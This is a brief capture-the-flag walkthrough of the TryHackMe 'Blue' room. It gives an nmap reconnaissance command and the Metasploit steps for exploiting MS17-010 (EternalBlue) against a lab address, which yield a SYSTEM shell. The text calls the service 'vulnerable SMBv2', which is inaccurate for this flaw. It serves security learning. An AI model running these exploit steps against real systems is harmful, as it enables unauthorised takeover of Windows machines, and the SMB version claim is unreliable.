# TryHackMe: Blue Room Walkthrough
**Date:** July 2026 | **Target OS:** Windows (EternalBlue Exploitation)

## 1. Reconnaissance
I started with an Nmap scan to find open ports:
`nmap -sV -sC -O 10.10.10.10`

*   **Port 445**: Running vulnerable SMBv2.

## 2. Exploitation
I used Metasploit to target the MS17-010 (EternalBlue) vulnerability:
1. `use exploit/windows/smb/ms17_010_eternalblue`
2. `set RHOSTS 10.10.10.10`
3. `exploit`

I successfully gained a `nt authority\system` shell!
